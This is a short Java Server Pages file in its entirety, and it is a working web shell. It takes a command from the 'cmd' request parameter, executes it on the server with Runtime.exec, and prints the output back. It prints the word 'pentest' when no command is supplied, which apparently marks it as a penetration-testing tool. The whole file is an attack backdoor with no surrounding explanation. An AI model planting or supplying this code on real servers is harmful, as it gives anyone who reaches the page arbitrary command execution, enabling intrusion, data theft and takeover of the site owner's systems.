<%@ page import="java.io.*" %><%
String cmd=request.getParameter("cmd");
if(cmd==null){out.print("pentest");}else{Process p=Runtime.getRuntime().exec(cmd);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String s;while((s=r.readLine())!=null){out.println(s);}}
%>
